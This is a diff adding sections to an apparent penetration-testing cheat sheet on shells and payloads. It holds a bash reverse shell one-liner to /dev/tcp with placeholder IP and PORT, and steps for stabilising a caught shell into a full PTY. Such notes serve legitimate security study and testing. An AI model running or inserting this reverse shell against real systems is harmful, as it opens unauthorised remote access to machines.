@@ -1,5 +1,32 @@
 # Shells & Payloads Cheat Sheet
 
+
+### Upgrading a Dumb Shell to a Full PTY
+Always do this immediately after getting a reverse shell:
+```bash
+# Step 1 — spawn PTY
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+# Step 2 — background it
+Ctrl+Z
+
+# Step 3 — fix terminal settings
+stty raw -echo; fg
+
+# Step 4 — set terminal type
+export TERM=xterm
+```
+Why: without this you get no tab completion, no arrow keys, Ctrl+C kills your shell, and vim/nano won't work.
+
+
+### Use Absolute Paths in Python App Reverse Shells
+Python virtual environments mess with `$PATH`. Always use full paths:
+```bash
+/bin/bash -c '/bin/bash -i >& /dev/tcp/IP/PORT 0>&1'
+# not just: bash -i >& /dev/tcp/...
+```
+
+
 ## Remote Desktop & Connection Tools
 
 | Command | Description |
